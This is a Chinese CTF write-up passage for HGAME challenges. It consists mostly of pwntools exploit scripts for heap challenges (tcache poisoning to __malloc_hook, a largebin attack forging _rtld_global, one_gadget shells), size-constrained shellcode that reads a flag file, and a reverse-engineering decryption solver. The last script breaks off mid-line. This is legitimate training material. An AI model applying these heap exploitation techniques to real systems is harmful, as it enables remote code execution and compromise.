<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:32672&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(ip[0],int(ip[1]))</span><br><span class="line">io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">def alloc(Index,size):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1)) </span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index)) # 最多16个idx，不能重复使用</span><br><span class="line">  io.sendlineafter(&#x27;Size: &#x27;, str(size))   # 最大0xFF -&gt; 0x100</span><br><span class="line">  </span><br><span class="line">def free(Index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index)) # 可以 UAF</span><br><span class="line">  </span><br><span class="line">def edit(Index,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line">  io.sendlineafter(&#x27;Content: &#x27;, content)</span><br><span class="line"></span><br><span class="line">def show(Index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(4))</span><br><span class="line">  io.sendlineafter(&#x27;Index: &#x27;, str(Index))</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">for i in range(8):</span><br><span class="line">  alloc(i,0x80)        # chunk0-6: tcachebin; chunk7: unsortedbin</span><br><span class="line"></span><br><span class="line">alloc(8,0x10)          # chunk8: 防 annex</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">  free(i)</span><br><span class="line"></span><br><span class="line">show(7)</span><br><span class="line">main_arena = u64(io.recvuntil(&#x27;\x7f&#x27;).ljust(8,b&#x27;\x00&#x27;)) - 0x60</span><br><span class="line">print(&#x27;main_arena       ---&gt;   &#x27;,hex(main_arena))</span><br><span class="line">libc_base = main_arena - 0x1ECB80</span><br><span class="line">print(&#x27;libc_base        ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">__malloc_hook = libc_base + libc.sym[&#x27;__malloc_hook&#x27;]</span><br><span class="line">print(&#x27;__malloc_hook    ---&gt;   &#x27;,hex(__malloc_hook))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p64(__malloc_hook)</span><br><span class="line">edit(6,payload)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(9,0x80)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">alloc(10,0x80)</span><br><span class="line"></span><br><span class="line">gdb.attach(io)</span><br><span class="line"></span><br><span class="line">one_gadget = [0xe3afe, 0xe3b01, 0xe3b04]</span><br><span class="line">for i in range(len(one_gadget)):</span><br><span class="line">  one_gadget[i] += libc_base</span><br><span class="line"></span><br><span class="line">payload = p64(one_gadget[1])</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(10))</span><br><span class="line">io.sendafter(&#x27;Content: &#x27;, payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1)) </span><br><span class="line">io.sendlineafter(&#x27;Index: &#x27;, str(11)) </span><br><span class="line">io.sendlineafter(&#x27;Size: &#x27;, str(0x10))   </span><br><span class="line"></span><br><span class="line"># gdb.attach(io)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [r12] == NULL || r12 == NULL</span><br><span class="line"></span><br><span class="line">0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [r15] == NULL || r15 == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line"></span><br><span class="line">0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)</span><br><span class="line">constraints:</span><br><span class="line">  [rsi] == NULL || rsi == NULL</span><br><span class="line">  [rdx] == NULL || rdx == NULL</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="shellcodemaster">ShellcodeMaster</h3>
<p>这题卡了最久...观察程序 context 然后研究怎么压缩
shellcode，整了老半天</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">ip = &#x27;106.14.57.14:31224&#x27;.split(&#x27;:&#x27;)</span><br><span class="line">file = &#x27;./vuln&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(ip[0],int(ip[1]))</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./vuln&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">code = &#x27;&#x27;&#x27;</span><br><span class="line">xor eax, eax</span><br><span class="line">cdq</span><br><span class="line">mov al, 10</span><br><span class="line">xchg rdi, r15</span><br><span class="line">mov dl, 7</span><br><span class="line">syscall</span><br><span class="line">xor eax, eax</span><br><span class="line">xchg esi, edi</span><br><span class="line">xor edi, edi</span><br><span class="line">xchg edx, ebx</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">shellcode1 = &#x27;&#x27;&#x27;</span><br><span class="line">mov rdi,0x2333008</span><br><span class="line">xor esi,esi</span><br><span class="line">mov rax,2</span><br><span class="line">syscall</span><br><span class="line">xor edx,edx</span><br><span class="line">mov rdi,3</span><br><span class="line">mov rdx,0x50</span><br><span class="line">mov esi,0x2333100</span><br><span class="line">mov rax,0</span><br><span class="line">syscall</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rdx,0x50</span><br><span class="line">mov esi,0x2333100</span><br><span class="line">mov rax,1</span><br><span class="line">syscall</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">payload1 = asm(shellcode1)</span><br><span class="line"></span><br><span class="line">shellcode=asm(code)</span><br><span class="line">print(len(shellcode))</span><br><span class="line">payload = b&#x27;\x90&#x27;*(len(shellcode)-14) + b&#x27;flag\x00\x00\x00\x00&#x27; + b&#x27;\x90&#x27;*8 + payload1</span><br><span class="line"></span><br><span class="line"># gdb.attach(io,&#x27;n 27&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendafter(&#x27;bytes shellcode\n\n&#x27;,shellcode)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="rev---24">Rev - 2/4</h2>
<h3 id="ezcpp">ezcpp</h3>
<p>这题读 cpp 的部分相当简单，核心加密部分用的 Tea，不过魔改了加密的
block，只加密了前12bytes，还魔改了加密前 8bytes 时的 delta.</p>
<h3 id="babyre">babyre</h3>
<p>多线程处理，不过每一次加密都是原子的，idx是全局变量，等前一个thread释放以后下一个thread才能处理，所以数组每一个元素都被加密一次，整个程序使用类似于
ECB 的方式加密。</p>
<p>所以我们可以用最后一位也就是藏在 flag 后面的的 flag[33]
来一位一位的向前解密</p>
<p>但这题比较恶心的点就是，触发 SIGFPE
会flag[33]++，在加密flag[32]也就是<code>&#125;</code>这个字符时有一定的变化</p>
<p>其次，触发 SIGFPE 还会让 'feifei' 这个 key 再被 <code>xor 0x11</code>
一轮，所以中间的 key 值会更改好几次，我们还没办法具体预测哪里触发了
SIGFPE 。</p>
<p>但根据 flag 的前几位为<code>hgame&#123;</code>，我们可以用 try-except
来从前向后解密，如果发现出现的字符不对，或者抛出异常，我们就可以确定原程序这里触发了
SIGFPE，我们就自行对 key 值 xor，这样到最后也不用管 flag[33] 了</p>
<p>python 处理可能会溢出的数据一定要记得 &amp; 0x..FF 取低位字节</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">encflag = [<span class="number">0x00002F14</span>, <span class="number">0x0000004E</span>, <span class="number">0x00004FF3</span>, <span class="number">0x0000006D</span>, <span class="number">0x000032D8</span>, <span class="number">0x0000006D</span>, <span class="number">0x00006B4B</span>, <span class="number">0xFFFFFF92</span>, <span class="number">0x0000264F</span>, <span class="number">0x0000005B</span>, <span class="number">0x000052FB</span>, <span class="number">0xFFFFFF9C</span>, <span class="number">0x00002B71</span>, <span class="number">0x00000014</span>, <span class="number">0x00002A6F</span>, <span class="number">0xFFFFFF95</span>, <span class="number">0x000028FA</span>, <span class="number">0x0000001D</span>, <span class="number">0x00002989</span>, <span class="number">0xFFFFFF9B</span>, <span class="number">0x000028B4</span>, <span class="number">0x0000004E</span>, <span class="number">0x00004506</span>, <span class="number">0xFFFFFFDA</span>, <span class="number">0x0000177B</span>, <span class="number">0xFFFFFFFC</span>, <span class="number">0x000040CE</span>, <span class="number">0x0000007D</span>, <span class="number">0x000029E3</span>, <span class="number">0x0000000F</span>, <span class="number">0x00001F11</span>, <span class="number">0x000000FF</span>,<span class="number">0xFa</span>]</span><br><span class="line">flag = <span class="string">&#x27;hgame&#123;yo23412341234123412341234&#125;&#x27;</span></span><br><span class="line">key = <span class="built_in">list</span>(<span class="string">&#x27;wtxwtx&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">list</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">ord</span>(flag[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(key)):</span><br><span class="line">    key[i] = <span class="built_in">ord</span>(key[i])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">exc = [<span class="number">8</span>,<span class="number">11</span>,<span class="number">14</span>,<span class="number">17</span>,<span class="number">20</span>,<span class="number">23</span>,<span class="number">26</span>,<span class="number">29</span>] <span class="comment"># 观察规律可知 exception_point = [x for x in range(8,30,3)]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> exc:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">            key[j] = key[j] ^ <span class="number">0x11</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">4</span> == <span class="number">0</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = (encflag[i] - flag[i]) // key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">1</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = ((flag[i] - encflag[i]) &amp; <span class="number">0xFFFFFFFF</span>) ^ key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">2</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = (encflag[i] // flag[i]) - key[(i+<span class="number">1</span>)%<span class="number">6</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> i % <span class="number">4</span> == <span class="number">3</span>:</span><br><span class="line">        flag[i+<span class="number">1</span>] = ((flag[i] ^ encflag[i]) + key[(i+<span class="number">1</span>)%<span class="number">6</span>]) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(flag[i+<span class="number">1</span>]),end=<span class="string">&#x27;&#x27;</span>)        </span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(flag[<span class="number">31</span>]),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h1 id="week3">Week3</h1>
<h2 id="pwn---一血">Pwn - 一血</h2>
<h3 id="eldenring3">EldenRing3</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;106.14.57.14:30208&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">Index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">Index,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># leak libc</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x500</span>,payload) <span class="comment"># avoid annexing</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">payload = <span class="string">&#x27;\x01&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">main_arena  = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x01</span> - <span class="number">0x60</span></span><br><span class="line">libc_base   = main_arena - (libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] + <span class="number">0x10</span>)</span><br><span class="line">large_bin   = main_arena + <span class="number">0x60</span> + <span class="number">1072</span></span><br><span class="line">rtld_global = libc_base + <span class="number">0x21b040</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak heap</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x5f0</span>,payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">3</span>,<span class="number">0x5f0</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">alloc(<span class="number">4</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">alloc(<span class="number">5</span>,<span class="number">0x500</span>,payload)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0x4f1</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">heap_base = u64(io.recvuntil(<span class="string">&#x27;\x0A&#x27;</span>)[-<span class="number">6</span>:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;heap_base    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x511</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">edit(<span class="number">3</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># largebin attack</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x528</span>,payload)</span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x508</span>,payload)</span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0x518</span>,payload)</span><br><span class="line">alloc(<span class="number">3</span>,<span class="number">0x500</span>,payload)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">alloc(<span class="number">4</span>,<span class="number">0x538</span>,payload)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rtld_global1    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(rtld_global))</span><br><span class="line">rtld_global = libc_base + ELF(<span class="string">&#x27;ld-linux-x86-64.so.2&#x27;</span>).sym[<span class="string">&#x27;_rtld_global&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rtld_global2    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(rtld_global))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;n 280&#x27;)</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(rtld_global - <span class="number">0x31028</span> - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">alloc(<span class="number">5</span>,<span class="number">0x600</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;n 280&#x27;)</span></span><br><span class="line"></span><br><span class="line">fake_rtld_global = heap_base + <span class="number">0xcd0</span> + <span class="number">0x10</span></span><br><span class="line">one_gadget = [<span class="number">0xdf54c</span>, <span class="number">0xdf54f</span>, <span class="number">0xdf552</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">  one_gadget[i] += libc_base</span><br><span class="line"></span><br><span class="line">fake_rtld_global = heap_base + <span class="number">0xcd0</span></span><br><span class="line">payload  = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(fake_rtld_global)</span><br><span class="line">payload  = payload.ljust(<span class="number">0x38</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x58</span>) + p64(<span class="number">0x8</span>) + p64(one_gadget[<span class="number">0</span>])</span><br><span class="line">payload  = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x40</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(fake_rtld_global + <span class="number">0x48</span>) <span class="comment"># 0x128</span></span><br><span class="line">payload  = payload.ljust(<span class="number">0x30c</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x1c</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line">edit(<span class="number">1</span>,<span class="string">b&#x27;b&#x27;</span>*<span class="number">0x500</span> + p64(<span class="number">0</span>))</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;n 279&#x27;)</span></span><br><span class="line"></span><br><span class="line">next_node = rtld_global - <span class="number">0x31028</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;main_arena     ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(main_arena))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;rtld_global    ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(rtld_global))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;next_node      ---&gt;   &#x27;</span>,<span class="built_in">hex</span>(next_node))</span><br><span class="line"><span class="comment"># print(&#x27;set_context    ---&gt;   &#x27;,hex(set_context))</span></span><br><span class="line"><span class="comment"># print(&#x27;ret            ---&gt;   &#x27;,hex(ret))</span></span><br><span class="line"><span class="comment"># print(&#x27;pop_rdi        ---&gt;   &#x27;,hex(pop_rdi))</span></span><br><span class="line"><span class="comment"># print(&#x27;binsh_addr     ---&gt;   &#x27;,hex(binsh_addr))</span></span><br><span class="line"><span class="comment"># print(&#x27;system_addr    ---&gt;   &#x27;,hex(system_addr))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0xdf54c execve(&quot;/bin/sh&quot;, r15, r12)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [r12] == NULL || r12 == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdf54f execve(&quot;/bin/sh&quot;, r15, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [r15] == NULL || r15 == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0xdf552 execve(&quot;/bin/sh&quot;, rsi, rdx)</span></span><br><span class="line"><span class="string">constraints:</span></span><br><span class="line"><span class="string">  [rsi] == NULL || rsi == NULL</span></span><br><span class="line"><span class="string">  [rdx] == NULL || rdx == NULL</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># loadfolder /mnt/e/EdgeDownload/libcTools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/.debug/.build-id</span></span><br></pre></td></tr></table></figure>
<h3 id="你满了那我就漫出来了">你满了,那我就漫出来了!</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">ip = <span class="string">&#x27;139.196.137.203:32320&#x27;</span>.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">file = <span class="string">&#x27;./vuln&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = remote(ip[0],int(ip[1]))</span></span><br><span class="line">io = process(file)</span><br><span class="line"><span class="comment"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.27.so&#x27;</span>)</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">alloc</span>(<span class="params">Index,size,content</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">  io.sendafter(<span class="string">&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">Index</span>):</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Your choice:&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">  io.sendlineafter(<span class="string">&#x27;Index: &#x27;</span>, <span class="built_in">str</span>(Index))</span><br><span class="line"><span class="comment"># ---------------------------------------------------------------------</span></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x17</span></span><br><span class="line">alloc(<span class="number">0</span>,<span class="number">0x88</span>,payload) <span class="comment"># 0 unsortedbin overlap</span></span><br><span class="line">alloc(<span class="number">1</span>,<span class="number">0x18</span>,payload) <span class="comment"># 1 tcachebin poisoning</span></span><br><span class="line">alloc(<span class="number">2</span>,<span class="number">0xf8</span>,payload) <span class="comment"># 2 trigger chunk</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">  alloc(i+<span class="number">3</span>,<span class="number">0x88</span>,payload) <span 